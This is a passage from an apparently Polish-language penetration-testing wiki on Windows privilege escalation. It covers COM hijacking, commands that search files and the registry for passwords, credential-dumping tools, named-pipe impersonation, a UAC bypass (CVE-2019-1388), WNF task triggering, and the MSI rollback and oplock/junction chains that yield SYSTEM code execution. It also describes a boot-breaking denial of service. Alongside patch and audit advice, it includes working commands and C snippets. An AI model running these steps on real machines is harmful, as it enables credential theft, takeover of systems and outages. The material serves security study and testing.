**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą class ID (CLSID)**, a każdy komponent udostępnia funkcje za pośrednictwem jednego lub większej liczby interfejsów, identyfikowanych przez interface IDs (IIDs).

Klasy i interfejsy COM są zdefiniowane w rejestrze, odpowiednio w gałęziach **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Rejestr ten powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wśród identyfikatorów CLSID w tym rejestrze można znaleźć podklucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na plik **DLL** oraz wartość **ThreadingModel**, która może przyjmować wartość **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) lub **Neutral** (Thread Neutral).

![Historia przeglądarki - COM DLL Overwriting: Wśród identyfikatorów CLSID w tym rejestrze można znaleźć podklucz InProcServer32, który zawiera wartość domyślną wskazującą na plik DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolny z plików DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli ten plik DLL zostanie uruchomiony przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrwalania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Wyszukiwanie ogólnych haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukiwanie pliku o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia wyszukujące hasła

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf**. Stworzyłem go, aby **automatycznie uruchamiać każdy moduł POST metasploit, który wyszukuje dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** używane przez różne narzędzia, które zapisują te dane w postaci zwykłego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Ujawnione uchwyty

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu głównego**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do uprzywilejowanego procesu utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o **wykrywaniu i wykorzystywaniu tej podatności**.](leaked-handle-exploitation.md)\
[Przeczytaj też **ten wpis, który dokładniej wyjaśnia, jak testować i nadużywać innych otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonation klienta Named Pipe

Segmenty pamięci współdzielonej, nazywane **pipes**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, także przez różne sieci. Przypomina to architekturę klient/serwer, w której role określa się jako **serwer named pipe** i **klient named pipe**.

Gdy **klient** wysyła dane przez pipe, **serwer**, który go utworzył, może **przyjąć tożsamość** **klienta**, o ile ma wymagane uprawnienia **SeImpersonate**. Wykrycie **uprzywilejowanego procesu**, który komunikuje się przez pipe, który możesz imitować, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez ciebie pipe. Instrukcje dotyczące przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie pozwala też **przechwytywać komunikację named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a to narzędzie pozwala wyświetlić listę wszystkich pipes i je przeglądać w poszukiwaniu privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD przez Telephony tapsrv prowadzący do RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny, uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby wykorzystać `ClientAttach` do wykonania dowolnego **4-bajtowego zapisu** w istniejącym pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- Wywołaj `ClientAttach`, ustawiając `pszDomainUser` na istniejącą ścieżkę, do której można zapisywać → usługa otworzy ją za pomocą `CreateFileW(..., OPEN_EXISTING)` i użyje do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje do tego uchwytu kontrolowany przez atakującego `InitContext` z `Initialize`. Zarejestruj aplikację linii za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz zdarzenia przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj aplikację i zamknij połączenie, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby wykonać `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej informacji:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą wykonywać kod w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużycie protocol handler / ShellExecute przez renderery Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne URI handlers (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

Po uzyskaniu shell jako użytkownik mogą być uruchamiane zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a UAC jest włączone, w niektórych wersjach Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM”, korzystając z konta nieuprzywilejowanego użytkownika.

Dzięki tej samej luce można jednocześnie eskalować uprawnienia i ominąć UAC. Nie trzeba też niczego instalować, a plik binarny używany w tym procesie jest podpisany i wydany przez Microsoft.

Do systemów podatnych na tę lukę należą między innymi:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu integralności Medium administratora do poziomu High / obejście UAC

Przeczytaj, aby **dowiedzieć się o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj, aby dowiedzieć się o UAC i obejściach UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction katalogu uploadu do katalogu obsługiwanego przez serwer

Aplikacja może tworzyć przewidywalny podkatalog uploadu, zapisywać w nim plik o nazwie podanej przez wywołującego, a następnie go przetwarzać. Jeśli użytkownik o niskich uprawnieniach może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może trafić przez junction do katalogu obsługiwanego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi webowej, jeśli serwer wykonuje pliki tego typu. Jest to specyficzna dla aplikacji granica arbitrary-write; sam zapisywalny katalog uploadu lub istniejący junction nie stanowią na to dowodu.

Sprawdź dokładny sposób konstruowania ścieżki i moment zapisu w handlerze uploadu, efektywne uprawnienia użytkownika do usunięcia i utworzenia podkatalogu, efektywne ACL katalogu docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w katalogu docelowym. Osobno potwierdź tożsamości procesów zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać ACL katalogów i metadane reparse point, ale nie pozwala ustalić zachowania handlera ani tego, czy w przyszłości nastąpi podmiana junction. Jeśli wykonanie odbywa się w kontekście konta usługi, przed rozważeniem osobnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Czyszczenie uprzywilejowanego zaplanowanego zadania wyzwalane przez WNF

Zaplanowane zadanie, które odrzuca ręczne uruchomienie, może mimo to udostępniać wyzwalacz nieuprzywilejowanemu użytkownikowi. Podczas audytu uprzywilejowanego zadania wyeksportuj jego XML i sprawdź **wszystkie** wyzwalacze, a także DACL zadania, podmiot i akcję. W szczególności `WnfStateChangeTrigger` wskazuje stan Windows Notification Facility (WNF); jeśli zabezpieczenia tego stanu zezwalają bieżącemu użytkownikowi na opublikowanie aktualizacji, użytkownik może pośrednio uruchomić zadanie z skonfigurowaną tożsamością, mimo że `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na przykład zadanie Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` działało jako SYSTEM, akceptowało od standardowego użytkownika aktualizacje stanu WNF `7508BCA32C079E41`, a następnie sprawdzało `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, nawet gdy Recall było wyłączone.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Aby przetestować osiągalność, rozwiąż `ZwUpdateWnfStateData` z `ntdll.dll`, wyślij pustą aktualizację dla ośmiobajtowej nazwy stanu i skoreluj zwrócony status z danymi o ostatnim uruchomieniu zadania lub aktywnością w Procmon. Poniższa uproszczona sonda używa sekwencji bajtów z przykładu zadania Recall; zastąp ją bajtami wyeksportowanymi dla testowanego zadania.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Przekształcanie rekurencyjnego czyszczenia w uprzywilejowane usuwanie

Przydatnym prymitywem jest nie sam wyzwalacz, lecz uprzywilejowana procedura czyszcząca, która przyjmuje katalog kontrolowany przez atakującego. Prześledź operację od enumeracji do końcowej modyfikacji: wyszukiwanie profili/sesji, wybieranie elementów podrzędnych za pomocą symboli wieloznacznych, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` to mocne wskazówki, że wcześniej sprawdzona ścieżka zostanie później przetworzona rekurencyjnie. Jeśli elementy podrzędne nie są otwierane względem zaufanych uchwytów katalogów i weryfikowane przed usunięciem, atakujący może zmienić sposób rozwiązywania ścieżki między enumeracją a użyciem.<sup>[[43]](#references)</sup>

Połącz wyzwalacz WNF z opisaną poniżej [podmianą za pomocą oplock, junction i dowiązania symbolicznego Object Manager](#from-folder-contents-delete-to-system-eop): oplock wstrzymuje proces czyszczący po wybraniu przez niego prawidłowego elementu podrzędnego, a następnie zapisywalny katalog nadrzędny zostaje podmieniony, tak aby wznowione uprzywilejowane usuwanie prowadziło przez `\RPC Control` do chronionego celu. W łańcuchu Recall pozwoliło to na usunięcie przez SYSTEM `C:\Config.Msi`, co było wymagane przez udokumentowaną technikę wycofywania MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Zagnieżdżone elementy podrzędne omijają płytkie poprawki dotyczące punktów ponownej analizy

Weryfikacja wyłącznie katalogu kontrolowanego przez atakującego i jego bezpośredniego elementu podrzędnego nie zabezpiecza rekurencyjnego usuwania opartego na ścieżce. Pozostaw te sprawdzone obiekty bez zmian, a podmianę junction/oplock przenieś do kolejnego elementu podrzędnego; `IFileOperation::DeleteItem` ostatecznie dotrze do nieweryfikowanego elementu potomnego i podąży za jego nowym celem. CVE-2026-20941 wynikało właśnie z takiej niekompletnej poprawki: pierwsza poprawka Recall weryfikowała katalog `UKP` i katalog o nazwie w formacie GUID, ale pozostawiała dotychczasową operację rekurencyjnego usuwania.<sup>[[43]](#references)</sup>

Bezpieczny wzorzec polega na otwieraniu **każdego elementu potomnego** względem już zaufanego uchwytu katalogu, pobieraniu i weryfikowaniu końcowej rozstrzygniętej ścieżki/obiektu oraz stosowaniu dyspozycji usunięcia do zweryfikowanego uchwytu. Nie weryfikuj prefiksu, a następnie nie wracaj do rekurencyjnego usuwania opartego na ścieżce. Podczas przeglądu poprawek sprawdź również struktury w rzeczywistym miejscu wywołania: w tym przypadku inspekcja działania programu wykazała, że `OBJECT_ATTRIBUTES` przy `NtCreateFile` zawiera niepuste `RootDirectory` oraz względną nazwę `{GUID}\\secure_file.lock`, co obaliło mylący wynik dekompilacji sugerujący istnienie drugiego prymitywu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do EoP jako SYSTEM

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), wraz z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji wycofywania zmian Windows Installer do zastąpienia prawidłowych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia katalogu `C:\Config.Msi`. Windows Installer użyje go później do przechowywania plików wycofywania zmian podczas odinstalowywania innych pakietów MSI; pliki wycofywania zostaną wcześniej zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM w Windows Installer (CVE-2025-27727)

Klient z niskimi uprawnieniami może uzyskać dostęp do usługi `msiexec.exe` działającej jako SYSTEM za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła ustalić, że istotne wywołania `IMsiServer` to `MsiBeginTransactionW` przy przesunięciu vtable `0xA0`, `SetEEUIDirectoryAndFilter` przy `0xC8` oraz `CleanupTempPackages` przy `0x50`. Te nazwy i przesunięcia ustalono w drodze inżynierii wstecznej i mogą się różnić między kompilacjami.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` personifikuje wywołującego tylko podczas otwierania podanej ścieżki z flagami `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Potwierdza to, że wywołujący może usunąć katalog, i zapobiega podążaniu za punktem ponownej analizy, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` funkcja `SetEEUIDirectoryAndFilter` rejestruje ścieżkę jako folder, niezależnie od argumentu filtra przekazanego przez wywołującego. Usługa zapisuje nazwaną wartość `REG_DWORD` w kluczu `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwą wartości jest ścieżka kontrolowana przez wywołującego, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio rozpoczyna czyszczenie. Jego podwyższony proces roboczy enumeruje wartości rejestru i przekazuje wpisy folderów do rekurencyjnej funkcji `FDeleteFolder` bez sprawdzania pochodzenia ścieżek. Jeśli zwykłe usunięcie się nie powiedzie, kod wywołuje również `LockdownPath`, usuwa atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odtworzona z `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Przydatnym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie przez junction. Zarejestruj utworzone przez atakującego `C:\Config.Msi`, usuń je, a następnie pozwól Windows Installerowi odtworzyć tę samą ścieżkę z chronionymi danymi rollback. Podczas czyszczenia zaufana jest nieaktualna nazwa `TempPackages`, więc nowy katalog zostaje usunięty jako SYSTEM. Omija to zamierzoną ochronę zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do poniższego łańcucha rollback: zachowaj osobny rekord `Installer\Folders`, usuń chroniony `C:\Config.Msi`, odtwórz go z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC` uzyskanym przed zaostrzeniem DACL przez instalator. Wcześniej otwarty uchwyt może przywrócić liberalną DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić przed wznowieniem rollback.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa bramka funkcji. Wywołanie COM nadal może zwrócić sukces, ale ścieżka kontrolowana przez atakującego nie jest już dodawana do `TempPackages`. Zastosuj aktualizacje zabezpieczeń systemu Windows z kwietnia 2025 r., zamiast uznawać pomyślny wynik metody za test poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowana technika wygląda następująco:

1. **Etap 1 – Przygotowanie do przejęcia (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby **użytkownik niebędący administratorem** mógł go uruchomić.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zacznie przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Odpytuj otwarty uchwyt pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć moment, w którym plik zmieni się w `C:\Config.Msi\<random>.rbf`.

- Krok 3: Własna synchronizacja
    - Plik `.msi` zawiera **własną akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — to **uniemożliwia jego usunięcie**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **katalog `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ręcznie usuń plik `.rbf` jako atakujący.
    - Teraz **katalog `C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **wyzwól podatność umożliwiającą usunięcie dowolnego folderu z uprawnieniami SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Podmiana skryptów rollback na złośliwe**

- Krok 6: Odtwórz `C:\Config.Msi` ze słabymi ACL
    - Samodzielnie odtwórz folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, ustawiając:
        - `TARGETDIR`: zapisywalną lokalizację.
        - `ERROROUT`: zmienną, która wywołuje wymuszoną awarię.
    - Ta instalacja posłuży do ponownego wywołania **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` do momentu pojawienia się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed rollback
    - Plik `.msi` zawiera **własną akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj słabe ACL
    - Po otrzymaniu zdarzenia `rbs created`:
        - Windows Installer **ponownie stosuje silne ACL** do `C:\Config.Msi`.
        - Ponieważ jednak nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie zastosować słabe ACL**.

> ACL są **egzekwowane tylko przy otwieraniu uchwytu**, więc nadal możesz zapisywać do folderu.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Zastąp plik `.rbs` **fałszywym skryptem rollback**, który nakazuje Windows:
        - Przywrócić plik `.rbf` (złośliwą bibliotekę DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwą bibliotekę DLL z payloadem działającym na poziomie SYSTEM**.

- Krok 12: Wyzwól rollback
    - Zasygnalizuj zdarzenie synchronizacji, aby instalator wznowił działanie.
    - Skonfigurowano **własną akcję typu 19 (`ErrorOut`)**, aby **celowo zakończyć instalację błędem** w znanym punkcie.
    - Spowoduje to rozpoczęcie **rollback**.

- Krok 13: SYSTEM instaluje Twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje bibliotekę DLL z pliku `.rbf` do lokalizacji docelowej.
    - Złośliwa **biblioteka DLL znajduje się teraz w ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Wykonaj kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą bibliotekę DLL.
    - **Gotowe**: Twój kod zostaje wykonany **jako SYSTEM**.


### Od arbitralnego usuwania/przenoszenia/zmiany nazw plików do SYSTEM EoP

Główna technika MSI rollback (opisana powyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **arbitralne usuwanie plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usunie cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych interfejsów API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do eskalacji uprawnień (EoP) do SYSTEM
Co jeśli Twoja prymitywa nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Uruchom proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplock — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Spowoduje to opróżnienie `folder1` bez naruszenia oplock.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplock.

- Opcja B: Zamień `folder1` na **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Atakuje to wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM działa dalej i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz wcześniej w tym miejscu folder**, system Windows nie załaduje właściwego sterownika podczas rozruchu.
- Następnie system Windows próbuje załadować `cng.sys` podczas rozruchu.
- Widzi folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje rozruch**.
- **Nie ma mechanizmu awaryjnego ani odzyskiwania** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych + symlinków OM do dowolnego nadpisania pliku / DoS podczas rozruchu

